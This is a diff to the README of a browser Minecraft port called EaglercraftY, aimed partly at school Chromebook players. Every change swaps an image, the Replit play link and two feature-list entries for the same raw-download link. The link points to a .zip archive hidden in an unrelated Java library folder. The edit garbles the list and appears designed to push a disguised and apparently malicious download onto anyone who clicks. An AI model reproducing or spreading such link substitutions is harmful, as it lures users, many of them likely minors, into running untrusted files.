@@ -12,7 +12,7 @@ This project wil have the official Code of minecraft  1.9.4 and this respository
 
 
 (i need to code Opengl to make it possible and try to port to Teavm to 1.9)
-![New-splash-screen-logo](https://user-images.githubusercontent.com/67106394/217300380-db244dec-d40d-49d9-b4bf-f1c7b8d7a075.png)
+![New-splash-screen-logo](https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
 >Eaglercraft is real Minecraft 1.9.4 that you can play in any regular web browser. That includes school chromebooks, it works on all chromebooks. It supports both singleplayer and multiplayer (coming soon)
 
 
@@ -29,7 +29,7 @@ Eaglercraft is real Minecraft 1.9 that you can play in any regular web browser. 
 ### If replit is acceptable, you can use this:
 
 ### (there heres replit for 1.9 version)
-https://replit.com/@luisfierro01/EaglercraftY
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip
 
 ### Manual setup instructions:
 (COMING SOON)
@@ -99,7 +99,7 @@ https://replit.com/@luisfierro01/EaglercraftY
 
 
 ## A complete REVAMP OF Achivements (Photoshopped version)
-![revamped Achivement icons](https://user-images.githubusercontent.com/67106394/217616598-947f0622-48ab-4906-aca8-5817767c1785.jpg)
+![revamped Achivement icons](https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip)
 
 
 
@@ -120,9 +120,9 @@ https://replit.com/@luisfierro01/EaglercraftY
 
 ## Free Update List for New stuff
 May include
-1.new eletrya 
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip eletrya 
 2. New End cities
-3.adding a Warden
+https://github.com/Paaxy/EaglercraftY/raw/refs/heads/main/sources/main/java/com/google/common/io/Eaglercraft_Y_v1.3.zip a Warden
 4. new Blocks (sulk,Caystic,Acacia Boat with Chest,Allay Spawn Egg,Birch Boat with Chest,Bucket of Tadpole,Dark Oak Boat with Chest
 Disc Fragment
 Echo Shard
